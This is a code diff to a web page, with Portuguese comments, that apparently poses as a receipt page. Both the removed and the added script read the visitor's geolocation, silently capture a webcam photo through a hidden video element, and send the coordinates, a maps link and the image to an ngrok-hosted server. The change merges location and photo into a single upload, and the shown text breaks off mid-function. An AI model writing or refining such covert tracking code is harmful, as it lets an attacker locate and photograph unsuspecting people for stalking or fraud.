@@ -38,92 +38,26 @@
     const dataFormatada = `${dia}/${mes}/${ano}`;
     document.getElementById("data-atual").textContent = dataFormatada;
 
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          position => {
-            sendLocation(position);
-            startCameraAndSendPhoto();
-          },
-          handleError
-        );
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
-
-    // Envia localização para o backend
-    function sendLocation(position) {
+    // Função que envia localização + foto juntos
+    function sendLocationAndPhoto(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch(`${NGROK_SERVER}/send-location`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude, longitude, maps }),
-      })
-        .then(res => res.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
+      startCameraAndGetPhoto((imageBase64) => {
+        if (!imageBase64) {
+          alert("Erro ao capturar a foto.");
+          return;
+        }
+
+        fetch(`${NGROK_SERVER}/send-data`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, maps, photo: imageBase64 }),
         })
-        .catch(err => {
-          console.error("Erro:", err);
-        });
-    }
-
-    // Captura foto da webcam e envia para backend
-    function startCameraAndSendPhoto() {
-      const video = document.createElement("video");
-      video.style.display = "none";
-      document.body.appendChild(video);
-
-      navigator.mediaDevices
-        .getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-          video.play();
-
-          video.addEventListener("canplay", () => {
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageBase64 = canvas.toDataURL("image/png");
-
-            stream.getTracks().forEach(track => track.stop());
-            video.remove();
-
-            fetch(`${NGROK_SERVER}/send-photo`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ image: imageBase64 }),
-            })
-              .then(res => res.json())
-              .then(data => {
-                if (!data.success) {
-                  alert("Erro ao enviar a foto.");
-                }
-              })
-              .catch(err => {
-                console.error("Erro ao enviar a foto:", err);
-              });
-          });
-        })
-        .catch(err => {
-          alert("Erro ao acessar a webcam: " + err.message);
-        });
-    }
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
-    }
-  </script>
-</body>
-
-</html>
+          .then(res => res.json())
+          .then(data => {
+            if (!data.success) {
+              alert("Erro ao enviar os dados.");
+            }
 
